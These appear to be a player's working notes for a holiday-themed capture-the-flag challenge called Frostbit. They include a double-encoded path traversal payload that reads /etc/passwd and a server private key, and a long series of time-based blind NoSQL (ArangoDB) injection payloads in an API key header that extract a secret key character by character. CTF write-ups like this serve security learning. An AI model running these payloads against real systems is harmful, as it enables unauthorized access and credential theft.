%74%55%04%7a%01%ea%7c%1a%74%55%04%7a%01%ea%7c%1a
%74%55%04%7a%01%ea%7c%1a%74%55%04%7a%01%ea%7c%1a
%2574%2555%2504%257a%2501%25ea%257c%251a%2574%2555%2504%257a%2501%25ea%257c%251a

LFI:
%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd

URL:
https://api.frostbit.app/view/%2574%2555%2504%257a%2501%25ea%257c%251a%2574%2555%2504%257a%2501%25ea%257c%251a%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=00000000000000000000000000000000&debug=true

RSA key -> EncryptedKey
Cyberchef, RSA PKCS1-V1_5 - input is encryptedkey but it must be binary I think (use cyberchef to convert)

Encryptedkey (128 bit key and 64 bit IV)
Cyberchef - AES (utf-8 values for key and IV) input open csv.frostbit as raw, output raw. Mode CBC

### Frostbit Deactivate
**Location:** The Front Yard (Act 3)
**NPC:** Tangle Coalbox
**Note:** This challenge uses the same assets as `Frostbit Decrypt`

*Wombley's ransomware server is threatening to publish the Naughty-Nice list. Find a way to deactivate the publication of the Naughty-Nice list by the ransomware server.*

Interesting message in frostbitfeed:
`Error msg: Unauthorized access attempt. /api/v1/frostbitadmin/bot/<botuuid>/deactivate, authHeader: X-API-Key, status: Invalid Key, alert: Warning, recipient: Wombley

https://api.frostbit.app/api/v1/frostbitadmin/bot/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/deactivate

Set query param debug=true

SQL injection point is in X-API-Key
give it a ' and this is what it returns
```
{
"debug": true,
"error": "Timeout or error in query:\nFOR doc IN config\n FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n <other_query_lines_omitted>\n RETURN doc"
}
```

Blocked:
```
;
return
\`
\n
/
*
values
insert
merge
update
unset
for
with
STARTS_WITH
```

Tried this:
' {x_api_key:"test"} INTO config
Didnt work

`' OR '1'=='1`
This didnt give a query error but gave an invalid key error.

' OR sleep(50)==null OR '1'=='1
' and 

sleep function seems to work, but the query times out at 2s so need to set sleep for max 1.9
Also need to set third comparison to resolve to true for the sleep to work for some reason:
`'OR sleep(1.9)==null OR '1'=='2

I FOUND SOMETHING
The following works (I put the sleep as the second comparison)

`'OR HAS(doc, "_id") OR sleep(1.9)==null OR '1'=='2`

If you change `_id` to something else, it will sleep for 1.9s but as is, it returns immediately. This means I can start to enumerate what parameters doc has.

I FOUND SOMETHING ELSE
I can also do the following queries to figure out how many attributes there are
`'OR LENGTH(doc)>0 OR sleep(1.9)==null OR '1'=='2` --> DELAY
`'OR LENGTH(doc)>10 OR sleep(1.9)==null OR '1'=='2` --> DELAY
`'OR LENGTH(doc)>4 OR sleep(1.9)==null OR '1'=='2` --> DELAY
`'OR LENGTH(doc)==4 OR sleep(1.9)==null OR '1'=='2` --> NO DELAY

So basically we found that there are 4 attributes in each doc. They should be the following:
- `_id`
- `_key`
- `_rev`
- {mystery api key attribute}

We now need to figure out what the API key attribute is called.
Maybe I can get the length of it somehow and guess from there.

This is working to get the length of the params
`'OR CHAR_LENGTH(NTH(ATTRIBUTES(doc),1))==4 OR sleep(1.9)==null OR '1'=='2`

Through a bunch of trial and error, I was able to get the following working
`'OR CHAR_LENGTH(NTH(ATTRIBUTES(doc),0))==18 OR sleep(1.9)==null OR '1'=='2` --> NO DELAY

That means our api key parameter is 18 chars long
frostbit_x_api_key 18????????????? :)))))) Maybe this will work

frostbit_x_api_key
Frostbit_X_Api_Key
FROSTBIT_X_API_KEY
frostbit-x-api-key
Frostbit-X-Api-Key
FROSTBIT-X-API-KEY
x_api_key_frostbit
X_Api_Key_Frostbit
X_API_KEY_FROSTBIT
x-api-key-frostbit
X-Api-Key-Frostbit
X-API-KEY-FROSTBIT

Frostbit-x-api-key
frostbit-X-api-key
frostbit-x-Api-key
frostbit-x-api-Key
Frostbit-X-api-key
Frostbit-X-Api-key
frostbit-X-Api-Key
frostbit-x-Api-Key
frostbit-X-API-KEY
-
Frostbit_x_api_key
frostbit_X_api_key
frostbit_x_Api_key
frostbit_x_api_Key
Frostbit_X_api_key
Frostbit_X_Api_key
frostbit_X_Api_Key
frostbit_x_Api_Key
frostbit_X_API_KEY

`'OR NTH(ATTRIBUTES(doc),0)=="X-API-KEY-FROSTBIT" OR sleep(1.9)==null OR '1'=='2`

None of these worked

`LET dynamicFieldName = NTH(ATTRIBUTES(doc),0)`
`INSERT MERGE({}, { [dynamicFieldName]: "test" }) INTO config`

`INSERT MERGE({}, { [NTH(ATTRIBUTES(doc),0)]: "secretapikey" }) INTO config`

Ok, the REPLACE function seems to not be blocked.

Man this is hard. Let me see if I can just figure out the first character of the parameter name

`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "key") OR sleep(1.9)==null OR '1'=='2` --> TRUE
`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "_api_key") OR sleep(1.9)==null OR '1'=='2` --> TRUE
frostbit
activate

`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "activate_api_key") OR sleep(1.9)==null OR '1'=='2` --> TRUE

`'OR CONTAINS(NTH(ATTRIBUTES(doc),0), "deactivate_api_key") OR sleep(1.9)==null OR '1'=='2` --> TRUE

FOUND IT:
`'OR NTH(ATTRIBUTES(doc),0)=="deactivate_api_key" OR sleep(1.9)==null OR '1'=='2`

Ok so now I think I need to do a REPLACE function and set the value to one I know.

`REPLACE { deactivate_api_key: "supersecretkey" } IN config`

`'REPLACE { deactivate_api_key: "supersecretkey" } IN config OR sleep(1.9)==null OR '1'=='2`

Didnt work, lets try MERGE function

`MERGE(doc, {"deactivate_api_key":"supersecretkey"})`

`'OR MERGE(doc, {"deactivate_api_key":"supersecretkey"})==1 OR sleep(1.9)==null OR '1'=='2`

merge blocked.......

`'OR (FOR d IN config REPLACE d WITH { deactivate_api_key: "supersecretkey" } IN config) OR sleep(1.9)==null OR '1'=='2`

`(REPLACE {_key: doc._key, deactivate_api_key: "glory" } IN config)`

`'OR (REPLACE {_key: doc._key, deactivate_api_key: "glory" } IN config) OR sleep(1.9)==null OR '1'=='2`

`(REPLACE doc WITH {_key: doc._key, deactivate_api_key: "glory" } IN config)`

`'OR (REPLACE doc WITH {_key: doc._key, deactivate_api_key: "glory" } IN config) OR sleep(1.9)==null OR '1'=='2`

WITH is blocked...

`'OR (REPLACE { _key: doc._key, deactivate_api_key: "glory" } IN config)==1 OR sleep(1.9)==null OR '1'=='2`

`doc.deactivate_api_key`

Ok now I think I need to enumerate the actual API key value...

`'OR CHAR_LENGTH(doc.deactivate_api_key)==36 OR sleep(1.9)==null OR '1'=='2` --> TRUE

Damn so the API key is 36 characters long. Not sure if this is a good way to do it...

`'OR CONTAINS(doc.deactivate_api_key, "frostbit") OR sleep(1.9)==null OR '1'=='2

`'OR SUBSTRING("frostbit", 0, 1)=="f" OR sleep(1.9)==null OR '1'=='2``

WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 7)=="abe7a6a" OR sleep(1.9)==null OR '1'=='2`

WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 10)=="abe7a6ad-7" OR sleep(1.9)==null OR '1'=='2`

CONTAINS:
a
b
c
d
e
f
1
2
4
5
6
7
9
0
-

WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 14)=="abe7a6ad-715e-" OR sleep(1.9)==null OR '1'=='2
WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 19)=="abe7a6ad-715e-4e6a-" OR sleep(1.9)==null OR '1'=='2`
WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 26)=="abe7a6ad-715e-4e6a-901b-c9" OR sleep(1.9)==null OR '1'=='2`
WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 30)=="abe7a6ad-715e-4e6a-901b-c9279a" OR sleep(1.9)==null OR '1'=='2`
WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 32)=="abe7a6ad-715e-4e6a-901b-c9279a96" OR sleep(1.9)==null OR '1'=='2`
WORKS: `'OR SUBSTRING(doc.deactivate_api_key, 0, 35)=="abe7a6ad-715e-4e6a-901b-c9279a964f9" OR sleep(1.9)==null OR '1'=='2`

DONE: `'OR SUBSTRING(doc.deactivate_api_key, 0, 36)=="abe7a6ad-715e-4e6a-901b-c9279a964f91" OR sleep(1.9)==null OR '1'=='2`

deactivate_api_key: `abe7a6ad-715e-4e6a-901b-c9279a964f91`